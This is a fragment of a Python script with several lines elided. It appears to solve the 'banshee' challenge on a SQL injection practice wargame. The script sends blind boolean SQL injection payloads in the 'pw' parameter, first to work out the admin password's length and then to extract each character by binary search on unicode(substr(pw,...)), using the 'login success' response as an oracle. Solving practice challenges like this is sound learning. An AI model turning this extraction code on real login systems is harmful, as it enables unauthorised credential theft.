...
url = f"https://los.rubiya.kr/chall/banshee_{URL_ID}.php"
...
for  i in range(1, 100):
    ...
    res = requests.get(url, params={'pw': f'\' or id=\'admin\' and {i} <= length(pw) --'},cookies=cookie)

    if res.text.find("<h2>login success!") > 0:
        pw_length = i
    else:
        break
...
for i in range(0, pw_length):
    ...
    while min_code + 1 != max_code:
        ...
        res = requests.get(url, params={'pw': f'\' or id=\'admin\' and {target} <= unicode(substr(pw,{i+1},1)) --'},cookies=cookie)
